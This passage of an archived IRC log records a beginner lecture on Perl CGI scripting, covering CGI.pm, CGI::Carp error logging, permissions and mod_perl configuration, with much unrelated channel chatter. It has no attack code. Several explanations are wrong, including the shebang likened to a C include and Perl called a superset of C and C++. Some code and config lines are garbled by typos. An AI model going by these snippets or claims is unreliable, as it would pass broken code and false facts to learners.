@@ -1,0 +1,744 @@
+<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
+<html>
+<head>
+   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+   <meta name="Author" content="default">
+   <meta name="GENERATOR" content="Mozilla/4.7 [en] (Win98; U) [Netscape]">
+   <title>Perl Web Automation Lecture</title>
+</head>
+<body>
+&nbsp;
+<p>
+<hr SIZE=1 WIDTH="61%">
+<center>Perl - Web Automation Lecture
+<br>By <a href="mailto:tejanshu@rediffmail.com">BitsNbytes</a>
+<br>for
+<br><a href="http://blacksun.box.sk">http://blacksun.box.sk</a></center>
+
+<hr SIZE=1 WIDTH="73%">
+<br>&nbsp;
+<p>*** bitsNbytes has joined #bsrf
+<br>&lt;bitsNbytes> hi ppl
+<br>&lt;bitsNbytes> I am EXtremely sorry for being late
+<br>&lt;bitsNbytes> should we begin with the lecture
+<br>&lt;fatboyjoe> just when everyone had given up hope of seeing it
+<br>&lt;bitsNbytes> yeah ..sorry man
+<br>&lt;fatboyjoe> heh
+<br>&lt;fatboyjoe> oh well
+<br>&lt;fatboyjoe> better late than never I guess :)
+<br>&lt;bitsNbytes> K..is everyone eager and attentive
+<br>&lt;pitpat> oh
+<br>&lt;pitpat> yea
+<br>&lt;bitsNbytes> hehe
+<br>&lt;pitpat> i'm all ears
+<br>&lt;pitpat> finally
+<br>&lt;pitpat> ;O)
+<br>&lt;bitsNbytes> lol
+<br>&lt;Yodason> =)
+<br>&lt;pitpat> ok bits
+<br>&lt;pitpat> are you doing it on perl?
+<br>&lt;bitsNbytes> k..the connection here in India is haywire t'day
+<br>&lt;bitsNbytes> and hence the delay
+<br>&lt;bitsNbytes> yeah..i'd like to know if there r total newbies too
+<br>&lt;pitpat> &lt;--- newbie of perl
+<br>&lt;bitsNbytes> i mean those who are absolutely oblivious to the existence
+of perl and its basics
+<br>*** Getalife has joined #bsrf
+<br>*** _ciR_ has quit IRC (Ping timeout: 180 seconds)
+<br>&lt;Getalife> Any phreakers around?
+<br>&lt;pitpat> &lt;--- not that much of a newbie
+<br>&lt;pitpat> hehe
+<br>&lt;bitsNbytes> hmm good then
+<br>&lt;bitsNbytes> what i am about to share with you t'day is the relation
+of perl and the web
+<br>&lt;pitpat> cgi
+<br>&lt;pitpat> common gateway interface
+<br>&lt;bitsNbytes> PRECISELY
+<br>&lt;pitpat> ;O)
+<br>&lt;bitsNbytes> hmm i have got a learned audience .. i must say
+<br>*** wascy|prepare_hack is now known as wascy
+<br>&lt;pitpat> go on...
+<br>&lt;bitsNbytes> when we talk of cgi..
+<br>&lt;bitsNbytes> we are talking about dynamic information
+<br>&lt;bitsNbytes> and interactivity
+<br>&lt;pitpat> server-side
+<br>&lt;pitpat> web
+<br>&lt;bitsNbytes> yess.. that is what makes the web so ALIVE
+<br>*** jacs has quit IRC (Ping timeout: 180 seconds)
+<br>&lt;bitsNbytes> Perl very much like other languages
+<br>&lt;pitpat> doesn't need to be compiled
+<br>&lt;bitsNbytes> supports the concept of modularity
+<br>&lt;bitsNbytes> ok.. that too (very basic tho) ;)
+<br>*** wascy has quit IRC (Quit: )
+<br>*** jacs has joined #bsrf
+<br>&lt;bitsNbytes> all modules are available today on Comprehensive Perl
+Archive Network (CPAN)
+<br>&lt;bitsNbytes> for Perl and CGI to&nbsp; be integrated we need the
+cgi.pm module
+<br>&lt;Getalife> Any phreakers around?
+<br>*** fatboyjoe has quit IRC (Ping timeout: 180 seconds)
+<br>&lt;bitsNbytes> that has to be included in our pel script
+<br>*** _ciR_ has joined #bsrf
+<br>&lt;pitpat> ciR
+<br>&lt;pitpat> i found the lecturer
+<br>&lt;_ciR_> who
+<br>&lt;pitpat> bitsNbytes
+<br>*** demontanus has quit IRC (Quit: Math is like sex. Add the people,
+subtract the clothes, divide the legs, and multiply.)
+<br>&lt;pitpat> hehe
+<br>&lt;bitsNbytes> let us begin with a sample basic program
+<br>&lt;_ciR_> hehe
+<br>&lt;pitpat> don't do the hello world plz
+<br>&lt;pitpat> :O(
+<br>&lt;_ciR_> looks like bsrf ous u
+<br>&lt;bitsNbytes> nah don't worry
+<br>&lt;pitpat> can you go a bit faster bits?
+<br>&lt;pitpat> i'm getting sleepy
+<br>&lt;bitsNbytes> i am trying
+<br>&lt;bitsNbytes> but the network connection seems to be outof order
+<br>&lt;bitsNbytes> #! /usr/bin/perl -w
+<br>&lt;bitsNbytes> this is the line that acts like a include &lt;> line
+in C
+<br>&lt;bitsNbytes> the -w is for warnings on
+<br>&lt;bitsNbytes> # a program for your type of babe
+<br>&lt;bitsNbytes> this was a comment
+<br>*** rek has joined #bsrf
+<br>*** ChanServ sets mode: +o rek
+<br>&lt;rek> hey
+<br>*** Arrowhead has quit IRC (Quit: )
+<br>&lt;bitsNbytes> use CGI qw (param)&nbsp;&nbsp; # a very important line..
+includes the cgi.pm module
+<br>&lt;rek> no lecture?
+<br>&lt;pitpat> yea bitsNbytes is doing it right now
+<br>&lt;bitsNbytes> print &lt;&lt;END_of_start;
+<br>&lt;bitsNbytes> Content-type: text/html&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+#needs no explanation
+<br>&lt;bitsNbytes> &lt;HTML>
+<br>&lt;bitsNbytes> &lt;HEAD>
+<br>&lt;bitsNbytes> &lt;TITLE> My kinda girl &lt;/TITLE>
+<br>*** fatboyjoe has joined #bsrf
+<br>&lt;bitsNbytes> &lt;/HEAD>
+<br>&lt;bitsNbytes> &lt;BODY>
+<br>&lt;Getalife> Can anyone assist me in making a scanner out of a cordless
+phone?
+<br>&lt;_ciR_> hahah not its HTML lecture
+<br>&lt;_ciR_> then &lt;p>hahah,&lt;/p>
+<br>*** rek has quit IRC (Quit: Leaving)
+<br>&lt;bitsNbytes> &lt;H1> Greetings Mortal &lt;/H1>
+<br>*** rek has joined #bsrf
+<br>*** ChanServ sets mode: +o rek
+<br>*** rek sets mode: +v bitsNbytes
+<br>&lt;bitsNbytes> END_of_start
+<br>*** sohed has joined #bsrf
+<br>*** zwanderer has joined #bsrf
+<br>&lt;bitsNbytes> my $favorite=param("brunette");
+<br>&lt;bitsNbytes> print "&lt;P> Your favorite flavor is $favorite.";
+<br>&lt;bitsNbytes> print &lt;&lt;ALL_Done;
+<br>&lt;bitsNbytes> &lt;/BODY>
+<br>&lt;bitsNbytes> &lt;/HTML>
+<br>&lt;bitsNbytes> ALL_Done
+<br>&lt;bitsNbytes> well was this understood
+<br>*** freespeachlamer has joined #bsrf
+<br>&lt;freespeachlamer> is the lecture over?
+<br>&lt;bitsNbytes> we just created a small basic interactive CGI-perl
+script that propmts the user for his
+<br>&lt;bitsNbytes> favorite chick type
+<br>*** TCL has joined #bsrf
+<br>*** ChanServ sets mode: +v TCL
+<br>&lt;freespeachlamer> umm can someone send me a log of the lecture?
+<br>&lt;bitsNbytes> no ... its just begun
+<br>&lt;freespeachlamer> oh
+<br>&lt;freespeachlamer> sorry :)
+<br>&lt;rek> bitsNbytes: your a little late
+<br>&lt;bitsNbytes> now if we don't wanna type all that HTML stuff
+<br>&lt;bitsNbytes> OK .. so what do u sugget "rek"
+<br>&lt;bitsNbytes> i mean suggest
+<br>&lt;rek> what u mean?
+<br>&lt;bitsNbytes> yeah .. i know i am late .....??
+<br>&lt;bitsNbytes> as long as there are a pair of attentive ears .. it's
+ok
+<br>&lt;rek> well, we had a lot more people, lot of us left @ 1:30...
+<br>&lt;rek> i was just makin sure u know.. go on with the lecture
+<br>&lt;bitsNbytes> yeah .. iknow and i am sorry (for the umpteenth time
+now)
+<br>*** jacs has quit IRC (Ping timeout: 180 seconds)
+<br>&lt;bitsNbytes> ok lemme ask how many of us are familiar with basic
+unix concepts and cgi scripting
+<br>&lt;Yodason> not me =p
+<br>*** jacs has joined #bsrf
+<br>* rek is
+<br>* fatboyjoe is
+<br>&lt;bitsNbytes> so i can really move on to REAL stuff
+<br>* freespeachlamer is not
+<br>&lt;freespeachlamer> but dont worry about me :)
+<br>*** freespeachlamer has quit IRC (Quit: )
+<br>&lt;bitsNbytes> then let us begin with what we really can do
+<br>&lt;bitsNbytes> k let us see this bit complex program i'vbe written
+<br>&lt;bitsNbytes> #! /usr/bin/perl -w
+<br>*** rek sets mode: +m
+<br>*** zwanderer has quit IRC (Quit: bye bye peppe)
+<br>&lt;bitsNbytes> # this program loads the cgi module to decide information
+by web server
+<br>&lt;bitsNbytes> use strict;
+<br>&lt;rek> bbl have to leave
+<br>*** pitpat has quit IRC (Quit: )
+<br>*** rek sets mode: -m
+<br>*** rek has quit IRC (Quit: )
+<br>&lt;bitsNbytes> man .. am i that boring
+<br>&lt;Yodason> lol'
+<br>&lt;TCL> lol
+<br>&lt;sohed> nope, go on
+<br>&lt;bitsNbytes> # the strict module ensures your code is in order and
+within the norms
+<br>&lt;bitsNbytes> so we write
+<br>&lt;bitsNbytes> use strict;
+<br>&lt;bitsNbytes> use CGI qw (:standard escapeHTML);
+<br>&lt;bitsNbytes> # now to get a parameter from a form
+<br>&lt;bitsNbytes> my $value=param ('PARAM_NAME');
+<br>*** Getalife has quit IRC (Read error: 104 (Connection reset by peer))
+<br>&lt;bitsNbytes> # and output a document
+<br>&lt;bitsNbytes> print header(), start_html("Howdy there!"),
+<br>&lt;bitsNbytes> p("U typed: ", tt(escapeHTML($value))),
+<br>&lt;bitsNbytes> end_html
+<br>&lt;bitsNbytes> some explanation now
+<br>&lt;bitsNbytes> CGI scripts are called in two main ways
+<br>&lt;bitsNbytes> referred to as "methods" --> not HTTP methods
+<br>&lt;bitsNbytes> one is the procedural method.. the other is object
+oriented
+<br>&lt;bitsNbytes> procedural for simple tasks
+<br>&lt;bitsNbytes> and object oriented for complex ones
+<br>&lt;bitsNbytes> our little program here can be analyzed as follows
+<br>*** X has joined #bsrf
+<br>*** DigitalFallout has quit IRC (Read error: 104 (Connection reset
+by peer))
+<br>&lt;bitsNbytes> as u might have guessed $anything stands for variable
+declaration in perl
+<br>&lt;X> meaw
+<br>&lt;bitsNbytes> perl supports all kinds of data types
+<br>*** essex has joined #bsrf
+<br>&lt;bitsNbytes> collectively called as "scalar variables"
+<br>&lt;bitsNbytes> u no longer have to specify a "type"
+<br>&lt;essex> Hi ya
+<br>&lt;bitsNbytes> u just say $whatever = somevalue
+<br>&lt;bitsNbytes> the "my" reserved word makes that particular variable
+or parameter
+<br>&lt;bitsNbytes> passed to a subroutine "local" to ur specific program
+<br>&lt;bitsNbytes> i.e. "my" for locality of reference ..ok
+<br>* essex want's to know if anyone knows a good VB decompiler
+<br>&lt;bitsNbytes> the header() returns a string content type
+<br>&lt;bitsNbytes> followed by the start_html
+<br>&lt;bitsNbytes> which returns the string, passed as parameter ,
+<br>*** phil has quit IRC (Remote closed the connection)
+<br>*** TCL has quit IRC (Quit: BBL)
+<br>&lt;bitsNbytes> ok.. now how do we use this program
+<br>&lt;bitsNbytes> i hope whatever i said was not too obvious
+<br>&lt;bitsNbytes> anywayz
+<br>&lt;bitsNbytes> i shall tell u how to get this prog running under UNIX
+<br>&lt;bitsNbytes> since I have very lil knowledge bout windowz
+<br>&lt;bitsNbytes> generally we place this program on a web server (running
+APACHE preferrably)
+<br>&lt;bitsNbytes> path-> /home/httpd/cgi-bin/program
+<br>&lt;bitsNbytes> where program is the program name
+<br>*** josh-hamster has joined #bsrf
+<br>&lt;bitsNbytes> and then use a browser lynx (for the console) Netscape,
+Amaya (for Xwin)
+<br>&lt;bitsNbytes> get the program running
+<br>&lt;bitsNbytes> am i .. making any sense to u ppl
+<br>&lt;bitsNbytes> feedbacks plz
+<br>&lt;HardW1r3> yeh
+<br>&lt;NIN_Dude> yes
+<br>&lt;bitsNbytes> OKay!
+<br>&lt;bitsNbytes> :)
+<br>&lt;bitsNbytes> some of you might be wondering why the HELL use Perl
+<br>&lt;bitsNbytes> there are many reasons ..out of which some are
+<br>&lt;bitsNbytes> PERL -->Practical&nbsp; Extract Report Language-->
+created by Larry Wall
+<br>*** BootError has joined #bsrf
+<br>&lt;bitsNbytes> is one of the most Powerful Scripting language on earth
+<br>&lt;bitsNbytes> apart from being a scripting language .. it also incorpaorates
+the best of C and C++
+<br>&lt;bitsNbytes> thus in short PERL is a superset of scripting lang,
+C and C++
+<br>*** [PhaLanX] has joined #bsrf
+<br>&lt;suspect> Who was the only guy to get his work done by Friday ?
+<br>&lt;bitsNbytes> the creator and other contributors have now&nbsp; thought
+of bringing this power to the Web
+<br>&lt;suspect> eh ?
+<br>*** ^CoaXiaL^ has quit IRC (Quit: )
+<br>&lt;bitsNbytes> suspect: something important ....?
+<br>&lt;bitsNbytes> i guess not
+<br>* NIN_Dude slaps suspect around a bit with a large trout
+<br>&lt;bitsNbytes> so let us move on to error handling
+<br>&lt;bitsNbytes> supposing u have trouble tracking down you scripts
+warnings
+<br>&lt;bitsNbytes> and error mesages, or your scripts STDERR output is
+confusing you
+<br>*** kamm has quit IRC (Quit: Leaving)
+<br>&lt;bitsNbytes> we use the CGI::Carp module
+<br>&lt;bitsNbytes> it is easy to understand if u know C++
+<br>&lt;bitsNbytes> it is analogous to using a class called CGI
+<br>&lt;bitsNbytes> and the "carp" portion of it
+<br>*** essex has quit IRC (Read error: 104 (Connection reset by peer))
+<br>&lt;bitsNbytes> i will now create a small prototype
+<br>&lt;bitsNbytes> to redirect errors to files of your choice
+<br>&lt;bitsNbytes> BEGIN
+<br>&lt;bitsNbytes> {
+<br>&lt;bitsNbytes> i wonder why nobody has any doubts
+<br>&lt;bitsNbytes> guess either i am talkin to myself or i am speaking
+in ancient phoenetix
+<br>&lt;bitsNbytes> anywaz
+<br>&lt;bitsNbytes> BEGIN
+<br>&lt;bitsNbytes> {
+<br>&lt;HardW1r3> im listening
+<br>&lt;sohed> me too
+<br>* NIN_Dude raises his hand
+<br>&lt;bitsNbytes> use CGI::Carp qw(carpout);
+<br>*** X is now known as Pr0nKing
+<br>&lt;bitsNbytes> yes
+<br>*** Pr0nKing is now known as P0rnKing
+<br>&lt;bitsNbytes> NIN_Dude:........?
+<br>&lt;NIN_Dude> um.. BEGIN?
+<br>&lt;NIN_Dude> as in class?
+<br>*** fatboyjoe has left #bsrf
+<br>* NIN_Dude cries
+<br>&lt;bitsNbytes> yes exactly
+<br>&lt;NIN_Dude> oh aight
+<br>&lt;bitsNbytes> notice the "qw" i am using frequently
+<br>&lt;bitsNbytes> it stands for quote words and is a wonderful lil reserved
+word
+<br>&lt;bitsNbytes> OK .. lemme switch back to basics and discuss a small
+simple perl program to
+<br>&lt;bitsNbytes> make things more clearer
+<br>*** [PhaLanX] has quit IRC (Quit: )
+<br>&lt;bitsNbytes> #! usr/bin/perl -w
+<br>&lt;bitsNbytes> print "Identify yourself!";
+<br>&lt;bitsNbytes> $name = &lt;STDIN>;
+<br>&lt;bitsNbytes> chomp ($name);
+<br>&lt;bitsNbytes> if ($name eq "PootieTang")
+<br>&lt;bitsNbytes> {
+<br>*** jacs has quit IRC (Quit: )
+<br>&lt;bitsNbytes> print " Hi there Pootie, You r simply the best!\n";
+<br>&lt;bitsNbytes> }
+<br>&lt;bitsNbytes> else{
+<br>&lt;bitsNbytes> print "Who r U $name\n";
+<br>&lt;bitsNbytes> }
+<br>&lt;NIN_Dude> chomp?
+<br>&lt;NIN_Dude> parsin?
+<br>&lt;bitsNbytes> coming .. to it
+<br>*** Kamikaze has joined #bsrf
+<br>&lt;Kamikaze> what is an stdin, stdout, and stderr?
+<br>&lt;NIN_Dude> ok
+<br>&lt;NIN_Dude> standard
+<br>&lt;NIN_Dude> input
+<br>* NIN_Dude shuts up
+<br>&lt;Kamikaze> aye...........
+<br>&lt;bitsNbytes> chomp cuts out the newline character
+<br>&lt;Kamikaze> not really much help but thanks anyway
+<br>&lt;bitsNbytes> the entire string is taken along with the newline char
+also a part of it
+<br>&lt;bitsNbytes> so u need to cut it off
+<br>&lt;Kamikaze> oh I see the tutorial is underway, sorry for interrupting
+<br>&lt;bitsNbytes> there is a function called "chop" also
+<br>&lt;NIN_Dude> does chomp cut off the last char or just the newline?
+<br>&lt;bitsNbytes> good question NIN
+<br>&lt;bitsNbytes> chop does cut off the last char
+<br>&lt;bitsNbytes> but not ole chomp
+<br>&lt;HardW1r3> dammit this sounds like school
+<br>&lt;Kamikaze> lol
+<br>&lt;bitsNbytes> it just does away with the&nbsp; \n
+<br>&lt;bitsNbytes> hehe
+<br>&lt;bitsNbytes> is it clear ;)
+<br>&lt;Kamikaze> really sorry for interrupting here but have you covered
+website redirection yet?
+<br>&lt;bitsNbytes> i have covered basic perl-cgi script and error redirection
+<br>&lt;Kamikaze> yeah yeah I know everyones gonna /ignore kamikaze :)
+<br>&lt;bitsNbytes> and will come to that just in a few moments
+<br>&lt;bitsNbytes> actually i have a hell lot to say
+<br>&lt;bitsNbytes> and very lil time i suppose
+<br>*** P0rnKing is now known as X
+<br>&lt;bitsNbytes> how long do the lectures go on usually
+<br>* Kamikaze shuts up and listens up
+<br>&lt;bitsNbytes> this is the first time i am delivering one
+<br>&lt;Kamikaze> as long as it takes till ppl are satisfactory
+<br>&lt;Kamikaze> satisfied^
+<br>&lt;bitsNbytes> k..fine
+<br>&lt;bitsNbytes> so is the basic structire of a perl prog clear
+<br>&lt;sohed> yes
+<br>&lt;Kamikaze> nope I missed it :)
+<br>*** s4m1k has joined #bsrf
+<br>&lt;bitsNbytes> then i revert back to the main topic of discussion
+<br>* Kamikaze will really shutup now... promise
+<br>*** ExposedTruth has quit IRC (Quit: )
+<br>&lt;bitsNbytes> now back to CGI_Perl
+<br>&lt;bitsNbytes> man the connection here in India sux
+<br>&lt;bitsNbytes> it is crawling
+<br>&lt;bitsNbytes> let us have a nice Graphical Interactivity
+<br>&lt;Kamikaze> I'm now reading 'Teach yourself C in 21 days'
+<br>*** fatboyjoe has joined #bsrf
+<br>&lt;bitsNbytes> hmm
+<br>&lt;Kamikaze> oops wrong chan
+<br>&lt;Kamikaze> shite
+<br>*** s4m1k has quit IRC (Quit: [x]chat)
+<br>&lt;Kamikaze> it's best if I leave
+<br>*** Kamikaze has left #bsrf
+<br>&lt;bitsNbytes> any doubts so far
+<br>&lt;bitsNbytes> any damn doubt that may be troubling anyone
+<br>&lt;NIN_Dude> what if it's not running UNIX?
+<br>&lt;bitsNbytes> then anyway u have to find a way to get ur program
+on the server
+<br>&lt;bitsNbytes> the web server..in the right location
+<br>&lt;bitsNbytes> the right path i mean
+<br>&lt;bitsNbytes> i am not familiar with the procedure for windowz tho
+<br>&lt;bitsNbytes> only when it is on the server .. can ur&nbsp; script
+be of any use
+<br>&lt;bitsNbytes> i have told .. how to get it running on UNIX
+<br>&lt;bitsNbytes> ok .. comin to where I left
+<br>&lt;bitsNbytes> the function for redirecting error messages
+<br>&lt;bitsNbytes> u have to try this&nbsp; .. code and learn
+<br>&lt;bitsNbytes> coz i have made it rigfht now
+<br>*** fatboyjoe has left #bsrf
+<br>&lt;bitsNbytes> so .. u get my point...;)
+<br>&lt;bitsNbytes> BEGIN {
+<br>&lt;bitsNbytes> use CGI::Carp qw(carpout)
+<br>&lt;bitsNbytes> open (LOG, ">>/var/local/cgi-logs/junk-error")
+<br>&lt;bitsNbytes> or die "Unable to append to junk-error: $!\n";
+<br>&lt;bitsNbytes> carpout(*LOG);
+<br>&lt;bitsNbytes> }
+<br>&lt;bitsNbytes> the carpout parameter is to carp-out or blurt out warnings
+or error returns
+<br>&lt;bitsNbytes> die is like exit()
+<br>&lt;bitsNbytes> to handle fatal errors
+<br>&lt;bitsNbytes> u can use
+<br>&lt;bitsNbytes> use CGI::Carp qw(fatalsToBrowser);
+<br>&lt;bitsNbytes> die "Fatal Error here!!";
+<br>&lt;bitsNbytes> Even if the error occurs before u get the HTTP header
+out
+<br>&lt;bitsNbytes> the module will try to take care of this to avoid the
+dreaded "500 server error"
+<br>&lt;bitsNbytes> how many of u r on a *NIX box
+<br>&lt;sohed> now?
+<br>&lt;bitsNbytes> yeah
+<br>&lt;bitsNbytes> or maybe do use a nix box freq.
+<br>*** snider has joined #bsrf
+<br>*** ChanServ sets mode: +o snider
+<br>&lt;sohed> i use it frequently but not right now
+<br>&lt;bitsNbytes> anyway .. even after taking care of errors if you happen
+to get the 500 server error
+<br>&lt;bitsNbytes> it means two things
+<br>&lt;bitsNbytes> on a Unix system either you dont have the right permissions
+<br>&lt;bitsNbytes> u can check that with the ls -l and assign the script
+(on the server of course) a 0755 pemission
+<br>&lt;bitsNbytes> 0755 if u owned it
+<br>*** Satori has joined #bsrf
+<br>&lt;bitsNbytes> and 0555 owned by the designated user, assuming u r
+the SU
+<br>&lt;bitsNbytes> SU = super user
+<br>*** Dustin has joined #bsrf
+<br>&lt;Dustin> kernel question:
+<br>&lt;bitsNbytes> also name it with a .cgi extension or .plx ext
+<br>&lt;Dustin> the docs in one place say to use 2.7.2.3 to compile 2.4.6
+<br>&lt;Dustin> in another it says NOT to use it
+<br>&lt;Dustin> what gcc version do i need?
+<br>&lt;Dustin> 2.7.2.3 or 2.91.66 ?
+<br>&lt;bitsNbytes> tho not necessary some servers identify the ext also
+<br>*** suspect has quit IRC (Ping timeout: 180 seconds)
+<br>&lt;bitsNbytes> Dustin: The latest
+<br>&lt;bitsNbytes> in ur case 2.7 will do
+<br>&lt;Dustin> i compiled a while ago with 2.96. something and got lots
+of errors
+<br>&lt;bitsNbytes> i maean 2.7.2.3
+<br>&lt;Dustin> ok
+<br>&lt;bitsNbytes> wht errors
+<br>&lt;Dustin> even though it says "*gcc 2.7.2.3 is no longer supportes*"
+<br>&lt;Dustin> uhm,
+<br>&lt;bitsNbytes> yeah module and version dependencies are quite annoying
+and can be solved best by trial and error
+<br>*** zwanderer has joined #bsrf
+<br>&lt;Dustin> let me rephrase it: it complied badly
+<br>&lt;Dustin> x wouldnt start, lots of cryptic x errors
+<br>&lt;bitsNbytes> heheh i know it happens
+<br>&lt;bitsNbytes> anyway.. we are here for something else
+<br>&lt;bitsNbytes> a lecture is in progress
+<br>&lt;Dustin> oh shit
+<br>&lt;bitsNbytes> so .. if u plz
+<br>*** SkyLemon has joined #bsrf
+<br>&lt;bitsNbytes> are the others listening
+<br>&lt;SkyLemon> Hello, I need some help: What is the file on linux that
+you edit to shutdown any services / close ports??
+<br>&lt;NIN_Dude> ...
+<br>&lt;bitsNbytes> for any queries regarding linux plz post them on messg
+board or mail me at tejanshu@rediffmail.com
+<br>*** Jesteruk has joined #bsrf
+<br>&lt;bitsNbytes> but plz do not go off the track
+<br>*** suspect has joined #bsrf
+<br>&lt;Jesteruk> hum...hello peeps
+<br>&lt;NIN_Dude> just keep going bits
+<br>&lt;bitsNbytes> yeah .. ..
+<br>&lt;Jesteruk> damn it i missed the lecture
+<br>&lt;bitsNbytes> a simple silly thing
+<br>&lt;Jesteruk> never poo poo a lecture dude
+<br>* NIN_Dude kills jester
+<br>&lt;bitsNbytes> if u want to compile a perl prog
+<br>&lt;Jesteruk> ah i see, nah i only write iot for CGI purposes
+<br>&lt;NIN_Dude> STFU
+<br>&lt;bitsNbytes> just use perl -wc cgi-script name=joe number=10
+<br>&lt;bitsNbytes> at the command prompt
+<br>*** HardW1r3 has quit IRC (Ping timeout: 180 seconds)
+<br>*** SkyLemon has quit IRC (Quit: )
+<br>&lt;bitsNbytes> this checks the validity of the program as well as
+runs with the mock input
+<br>&lt;Jesteruk> aaah i see..i didnt know that
+<br>&lt;Jesteruk> i got an apache web server setup..PHP mySQL support,
+and perl..i test em that way, didn't know you could simulate it liek that
+thru DOS prompt
+<br>&lt;bitsNbytes> well u know&nbsp; now ;)
+<br>&lt;NIN_Dude> DOS?
+<br>&lt;Jesteruk> aye, NIN
+<br>*** zwanderer has quit IRC (Quit: off)
+<br>&lt;bitsNbytes> he means on the "console"
+<br>&lt;NIN_Dude> nm
+<br>&lt;NIN_Dude> yeah
+<br>&lt;Jesteruk> i mean in that black bit where you type shit
+<br>&lt;Jesteruk> ;)
+<br>&lt;NIN_Dude> heh...
+<br>&lt;bitsNbytes> now how to make our scripts more efficient
+<br>&lt;bitsNbytes> this is mainly for Unix audience
+<br>&lt;Jesteruk> As long as mine work, i'm happy
+<br>*** pitpat has joined #bsrf
+<br>&lt;bitsNbytes> Use mod_perl in the Apache server
+<br>&lt;pitpat> wow bitsNbytes still going
+<br>&lt;Jesteruk> go on dude...
+<br>&lt;pitpat> >=)
+<br>&lt;bitsNbytes> also edit the httpd.conf as followz
+<br>&lt;Jesteruk> I run mine on a unix server, just test em on here, i
+cant install linux cause i got a software modem, and im not financially
+able to buy new shit
+<br>&lt;Jesteruk> *listenin*
+<br>&lt;bitsNbytes> Alias /perl/&nbsp; /real/path/to/perl/scripts
+<br>&lt;bitsNbytes> the above line is not to be typed as it is
+<br>&lt;bitsNbytes> it means direct it to ur perl script directory
+<br>&lt;bitsNbytes> then in the next line
+<br>&lt;Jesteruk> yeah, assign a virtual path to the system path
+<br>&lt;bitsNbytes> &lt;Location /perl>
+<br>&lt;bitsNbytes> SetHandler perl-script
+<br>&lt;bitsNbytes> PerlHandler Apache::Registry
+<br>&lt;bitsNbytes> Options ExecCGI
+<br>&lt;bitsNbytes> &lt;/Location>
+<br>&lt;bitsNbytes> leave a line
+<br>*** Dustin has quit IRC (Read error: 104 (Connection reset by peer))
+<br>&lt;bitsNbytes> PerlModule Apache::Registry
+<br>&lt;bitsNbytes> PerlModule CGI
+<br>&lt;bitsNbytes> PerlHandler On
+<br>&lt;bitsNbytes> this is what u have to type in your /etc/httpd.conf
+file
+<br>&lt;Jesteruk> how exactly down the mod_perl thingy simply scripting?
+<br>&lt;bitsNbytes> the PerlModule CGI preloads the CGI module
+<br>&lt;Jesteruk> down=does (beer)
+<br>*** pitpat has quit IRC (Quit: )
+<br>&lt;bitsNbytes> PerlHeader On makes most of your scripts run out of
+the box with mod_perl
+<br>&lt;Jesteruk> hum , i see
+<br>&lt;bitsNbytes> now .. perl was designed to be a glue language
+<br>&lt;Jesteruk> Recently ive been readin about perl with mySQL, i dun
+like PHP
+<br>&lt;bitsNbytes> that means it provide sscope for embedding code excerpts
+from other langs or some system calls
+<br>&lt;Jesteruk> it has all the cool shit from other languages, and dont
+have the uncool shit..apparently
+<br>&lt;bitsNbytes> you can do so easily
+<br>&lt;Jesteruk> i found a few good reads
+<br>&lt;Jesteruk> and some shit ones
+<br>* NIN_Dude shoots jester in the face
+<br>&lt;bitsNbytes> hehehe
+<br>&lt;Jesteruk> i fear you now.
+<br>&lt;bitsNbytes> now how about formatting lists and tables with HTML
+shortcuts
+<br>&lt;Jesteruk> im listenin
+<br>&lt;bitsNbytes> for this purpose the CGI module provides HTML helper
+functions
+<br>*** Norton has joined #bsrf
+<br>&lt;bitsNbytes> which, when passed as array refernces(pointers to arrays)
+<br>*** TCL has joined #bsrf
+<br>*** ChanServ sets mode: +v TCL
+<br>&lt;Jesteruk> which does what exactly?
+<br>&lt;Jesteruk> oops...
+<br>&lt;bitsNbytes> apply themselves to each element of the referenced
+array ;)
+<br>&lt;bitsNbytes> for example
+<br>&lt;bitsNbytes> print ol(li(qw(red blue green)])};
+<br>&lt;bitsNbytes> sorry the last } is actually a )
+<br>&lt;Jesteruk> hum, that looks irish to me
+<br>&lt;NIN_Dude> HTML
+<br>&lt;NIN_Dude> ol
+<br>&lt;NIN_Dude> li
+<br>&lt;Jesteruk> ah..
+<br>&lt;NIN_Dude> qw?
+<br>&lt;NIN_Dude> perl?
+<br>&lt;Jesteruk> what's perl?
+<br>&lt;bitsNbytes> yeah the qw is NEAT
+<br>&lt;NIN_Dude> you went over earlier
+<br>&lt;NIN_Dude> i forgot
+<br>&lt;NIN_Dude> :\
+<br>&lt;Jesteruk> well damn it
+<br>&lt;bitsNbytes> rather than qoute each individual element passed as
+parameter
+<br>&lt;bitsNbytes> u just say qw(....)
+<br>*** TCL has quit IRC (Quit: 3 2 1, 1 2 3, who the heck is haxoring
+me?!)
+<br>&lt;NIN_Dude> so like string?
+<br>&lt;bitsNbytes> all the words within the braces get quoted individually
+<br>&lt;Jesteruk> aaah
+<br>&lt;bitsNbytes> just like in the above line qw (red blue green) means
+<br>*** Grendel has quit IRC (Quit: brb)
+<br>&lt;bitsNbytes> ("red",&nbsp; "blue", "green")
+<br>&lt;NIN_Dude> yeah
+<br>&lt;NIN_Dude> i got it now
+<br>*** Grendel has joined #bsrf
+<br>&lt;bitsNbytes> ok now the next line is
+<br>*** CHAOS has joined #bsrf
+<br>*** ChanServ sets mode: +v CHAOS
+<br>&lt;bitsNbytes> &lt;OL>&lt;LI>red&lt;/LI>&nbsp; &lt;LI>blue&lt;/LI>
+&lt;LI>green&lt;/LI>&lt;/OL>
+<br>*** Jesteruk has left #bsrf
+<br>&lt;bitsNbytes> let us see how this workz when implemented actually
+<br>&lt;CHAOS> www.www.www
+<br>&lt;NIN_Dude> what's the print ol(li(qw(red blue green))) do?
+<br>&lt;bitsNbytes> coming to it
+<br>&lt;NIN_Dude> k
+<br>&lt;bitsNbytes> just give me some time
+<br>&lt;bitsNbytes> i am having a nasty time with the ****ing connection
+here
+<br>&lt;bitsNbytes> use CGI qw(:standard :html3);
+<br>&lt;bitsNbytes> %hash = (
+<br>&lt;CHAOS> *yawwwnie!*
+<br>&lt;bitsNbytes> "BitsNbytes => ["Alcoholic", "druggie", "nerd"]
+<br>*** _ciR_ has quit IRC (Ping timeout: 180 seconds)
+<br>&lt;bitsNbytes> "lamest1 => ["Cool", "lame", "funny"]
+<br>&lt;bitsNbytes> );
+<br>&lt;bitsNbytes> $\ = "\n";
+<br>&lt;bitsNbytes> print "&lt;TABLE> &lt;CAPTION>People I know&lt;/CAPTION>
+<br>*** nskl has joined #bsrf
+<br>&lt;bitsNbytes> print Tr (th [qw(people type)]);
+<br>&lt;bitsNbytes> for $k (sort keys %hash) {
